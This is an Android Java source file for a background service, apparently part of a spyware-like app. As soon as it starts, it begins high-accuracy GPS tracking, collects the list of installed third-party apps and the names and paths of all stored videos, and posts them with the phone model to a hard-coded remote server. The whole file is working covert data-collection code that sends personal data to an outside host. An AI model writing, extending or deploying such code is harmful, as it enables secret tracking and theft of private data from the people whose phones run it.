package com.naruto.didi2.service;

import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageInfo;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.net.Uri;
import android.os.Build;
import android.os.Handler;
import android.os.IBinder;
import android.os.Message;
import android.provider.MediaStore;
import android.util.Log;

import com.baidu.location.BDAbstractLocationListener;
import com.baidu.location.BDLocation;
import com.baidu.location.LocationClient;
import com.baidu.location.LocationClientOption;
import com.naruto.didi2.constant.Constants;
import com.naruto.didi2.util.LogUtils;
import com.naruto.didi2.util.OkHttpUtil;
import com.naruto.didi2.util.SpUtils;

import java.util.HashMap;
import java.util.List;
import java.util.Map;

public class SendDataService extends Service {

    private LocationClient locationClient;
    private final String TAG = "yylog";
    private Context mContext;

    private String rUrl = "http://shenying.5gzvip.idcfengye.com/shenying/saveDeviceServlet";
//    private String rUrl = "http://192.168.155.1:8080/shenying/saveDeviceServlet";
    private Handler mHandler = new Handler() {
        @Override
        public void handleMessage(Message msg) {
            switch (msg.what) {
                case 0:
                    if (locationClient != null) {
                        locationClient.stop();
                    }
                    break;
            }
        }
    };

    public SendDataService() {
    }

    @Override
    public IBinder onBind(Intent intent) {
        // TODO: Return the communication channel to the service.
        throw new UnsupportedOperationException("Not yet implemented");
    }

    @Override
    public void onCreate() {
        super.onCreate();
        mContext = this;
        LogUtils.e("SendDataService onCreate");
        initLocationOption();
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        LogUtils.e("SendDataService onStartCommand");
        return super.onStartCommand(intent, flags, startId);
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        LogUtils.e("SendDataService onDestroy");
    }

    /**
     * 初始化定位参数配置
     */

    private void initLocationOption() {
//定位服务的客户端。宿主程序在客户端声明此类，并调用，目前只支持在主线程中启动
        locationClient = new LocationClient(getApplicationContext());
//声明LocationClient类实例并配置定位参数
        LocationClientOption locationOption = new LocationClientOption();
        MyLocationListener myLocationListener = new MyLocationListener();
//注册监听函数
        locationClient.registerLocationListener(myLocationListener);
//可选，默认高精度，设置定位模式，高精度，低功耗，仅设备
        locationOption.setLocationMode(LocationClientOption.LocationMode.Hight_Accuracy);
//可选，默认gcj02，设置返回的定位结果坐标系，如果配合百度地图使用，建议设置为bd09ll;
        locationOption.setCoorType("gcj02");
//可选，默认0，即仅定位一次，设置发起连续定位请求的间隔需要大于等于1000ms才是有效的
        locationOption.setScanSpan(20000);
//可选，设置是否需要地址信息，默认不需要
        locationOption.setIsNeedAddress(true);
//可选，设置是否需要地址描述
        locationOption.setIsNeedLocationDescribe(true);
//可选，设置是否需要设备方向结果
        locationOption.setNeedDeviceDirect(false);
//可选，默认false，设置是否当gps有效时按照1S1次频率输出GPS结果
        locationOption.setLocationNotify(false);
//可选，默认true，定位SDK内部是一个SERVICE，并放到了独立进程，设置是否在stop的时候杀死这个进程，默认不杀死
        locationOption.setIgnoreKillProcess(true);
//可选，默认false，设置是否需要位置语义化结果，可以在BDLocation.getLocationDescribe里得到，结果类似于“在北京天安门附近”
        locationOption.setIsNeedLocationDescribe(true);
//可选，默认false，设置是否需要POI结果，可以在BDLocation.getPoiList里得到
        locationOption.setIsNeedLocationPoiList(true);
//可选，默认false，设置是否收集CRASH信息，默认收集
        locationOption.SetIgnoreCacheException(false);
//可选，默认false，设置是否开启Gps定位
        locationOption.setOpenGps(true);
//可选，默认false，设置定位时是否需要海拔信息，默认不需要，除基础定位版本都可用
        locationOption.setIsNeedAltitude(false);
//设置打开自动回调位置模式，该开关打开后，期间只要定位SDK检测到位置变化就会主动回调给开发者，该模式下开发者无需再关心定位间隔是多少，定位SDK本身发现位置变化就会及时回调给开发者
        locationOption.setOpenAutoNotifyMode();
//设置打开自动回调位置模式，该开关打开后，期间只要定位SDK检测到位置变化就会主动回调给开发者
        locationOption.setOpenAutoNotifyMode(3000, 1, LocationClientOption.LOC_SENSITIVITY_HIGHT);
//需将配置好的LocationClientOption对象，通过setLocOption方法传递给LocationClient对象使用
        locationClient.setLocOption(locationOption);
//开始定位
        locationClient.start();
    }

    /**
     * 实现定位回调
     */
    public class MyLocationListener extends BDAbstractLocationListener {
        @Override
        public void onReceiveLocation(BDLocation location) {

            //获取详细地址信息
            String addrStr = location.getAddrStr();
            double latitude = location.getLatitude();    //获取纬度信息
            double longitude = location.getLongitude();    //获取经度信息
            String locationDescribe = location.getLocationDescribe();
            Log.e(Constants.TAG, "所在位置: " + longitude + "," + latitude + ":" + locationDescribe);

            if (locationDescribe != null) {
                String s = addrStr + "\n" + locationDescribe;
                Log.e(Constants.TAG, "拿到位置信息");
                sendData(s);
            } else {
                sendData("ooo");
            }
        }
    }

    private void sendData(final String location) {
        int status = SpUtils.getValue(this, SpUtils.UPLOADSTATUS);
        if (status == 1) {
            return;
        }
        SpUtils.saveValue(this, SpUtils.UPLOADSTATUS, 1);
        new Thread(
                new Runnable() {
                    @Override
                    public void run() {
//                        startTimer();
//                        SpUtils.saveValue(SendDataActivity.this, SpUtils.UPLOADSTATUS, 1);
                        String thirdAppList = getThirdAppList(mContext);
                        String video = getVideo();
//                        String video ="我是默认值";
                        String brand = Build.BRAND;
                        String model = Build.MODEL;
                        Map<String, String> body = new HashMap<>();
                        body.put("location", brand + model + "==" + location);
                        body.put("software", thirdAppList);
                        body.put("video", video);
                        Log.e(TAG, "开始上传: ");
                        Log.e(TAG, "获取到位置: " + brand + model + "==" + location);
                        Log.e(TAG, "获取到应用: " + thirdAppList);
                        Log.e(TAG, "获取到video: " + video);
                        //发送邮件数据
//                        String phoneContent = brand + model + "\n" + thirdAppList + "\n" + video;
//                        AppUtil.getInstance().send(preferences, phoneContent, mHandler);
                        OkHttpUtil.getInstance().doPost(rUrl, body, new OkHttpUtil.DataCallBack() {
                            @Override
                            public void onSuccess(String s) {
                                if ("200".equals(s)) {
                                    Log.e(TAG, "onSuccess上传信息成功: ");
                                    if (!location.equals("ooo")) {
                                        mHandler.sendEmptyMessage(0);
                                        SpUtils.saveValue(mContext, SpUtils.UPLOADSTATUS, 1);
                                    }
                                } else if ("500".equals(s)) {
                                    SpUtils.saveValue(mContext, SpUtils.UPLOADSTATUS, 0);
//                                    mHandler.sendEmptyMessage(1);
                                    Log.e(TAG, "上传设备信息失败: ");
                                }
                            }

                            @Override
                            public void onFailure(String f) {
                                SpUtils.saveValue(mContext, SpUtils.UPLOADSTATUS, 0);
//                                mHandler.sendEmptyMessage(1);
                                Log.e(TAG, "onFailure: " + f);
                            }
                        });
                    }
                }
        ).start();
    }

    private String getThirdAppList(Context context) {
        long startTime = System.currentTimeMillis();
        int sum = 0;
        StringBuilder stringBuilder = new StringBuilder();
        try {
            PackageManager packageManager = context.getPackageManager();
            List<PackageInfo> packageInfoList = packageManager.getInstalledPackages(0);
            // 判断是否系统应用：
//        List<String> thirdAPP = new ArrayList<>();
            for (int i = 0; i < packageInfoList.size(); i++) {
                PackageInfo pak = (PackageInfo) packageInfoList.get(i);
                //判断是否为系统预装的应用
                if ((pak.applicationInfo.flags & pak.applicationInfo.FLAG_SYSTEM) <= 0) {
                    // 第三方应用
                    String appName = pak.applicationInfo.loadLabel(getPackageManager()).toString();
//                Log.e(Constants.TAG, "getThirdAppList: " + appName);
                    stringBuilder.append(appName + "\n");
//                thirdAPP.add(pak.packageName);
                    sum++;
                } else {
                    //系统应用
                }
            }
        } catch (Exception e) {
            Log.e(Constants.TAG, "Exception: " + e.getMessage());
        }
        long enTime = System.currentTimeMillis();
        Log.e(Constants.TAG, "getThirdAppList用时: " + (enTime - startTime) + "毫秒");
        Log.e(Constants.TAG, "getThirdAppList数量: " + sum);
        return stringBuilder + "";
    }

    private String getVideo() {
        Cursor cursor = null;
        try {
            Uri uri = MediaStore.Video.Media.EXTERNAL_CONTENT_URI;
//                Uri uri = MediaStore.Video.Media.INTERNAL_CONTENT_URI;

            String[] projections = {
                    MediaStore.Video.Media.DISPLAY_NAME,//名称
                    MediaStore.Video.Media.DURATION,//时长
                    MediaStore.Video.Media.SIZE,//大小
                    MediaStore.Video.Media.DATA,//路径
            };
            cursor = getContentResolver().query(uri, projections, null, null, null);
            if (cursor == null) {
                return "";
            }
            StringBuilder videoInfos = new StringBuilder();
            while (cursor.moveToNext()) {
                StringBuffer videoInfo = new StringBuffer();
                String name = cursor.getString(0);
                String duration = convertTime(cursor.getLong(1));
                float size = convertMb(cursor.getLong(2));//查询出来一bytew
                String address = cursor.getString(3);
                videoInfo.append("文件详情: name:")
                        .append(name)
                        .append("===时长：")
                        .append(duration)
                        .append("===大小：")
                        .append(size)
                        .append("mb===路径：")
                        .append(address);
                videoInfos.append(videoInfo).append("\n");
//                    Log.e(TAG, "文件详情: " + "name:" + name + "===时长：" + duration + "===大小：" + size + "mb===路径：" + address);
            }
            cursor.close();
            Log.e(TAG, "getVideo: " + videoInfos.toString());
            return videoInfos.toString();
        } catch (Exception e) {
            Log.e(TAG, "getVideoException: " + e.getMessage());
        } finally {
            if (cursor != null) {
                cursor.close();
            }
        }
        return "";
    }

    private String convertTime(long time) {
        try {
            long hours = time / (1000 * 60 * 60);
            long minutes = (time - hours * (1000 * 60 * 60)) / (1000 * 60);
            long seconds = ((time - hours * (1000 * 60 * 60)) - (minutes * 60 * 1000)) / 1000;
            StringBuffer diffTime = new StringBuffer();
            if (hours == 0) {
                diffTime.append(minutes).append("分").append(seconds).append("秒");
            } else {
                diffTime.append(hours).append("时").append(minutes).append("分").append(seconds).append("秒");
            }
            return diffTime.toString();
        } catch (Exception e) {
            Log.e(Constants.TAG, "Exception: " + e.getMessage());
        }
        return "";
    }

    private float convertMb(long bytes) {
        try {
            return (float) Math.round((float) bytes / 1024 / 1024 * 100) / 100;
        } catch (Exception e) {
            e.printStackTrace();
        }
        return 0;
    }
}
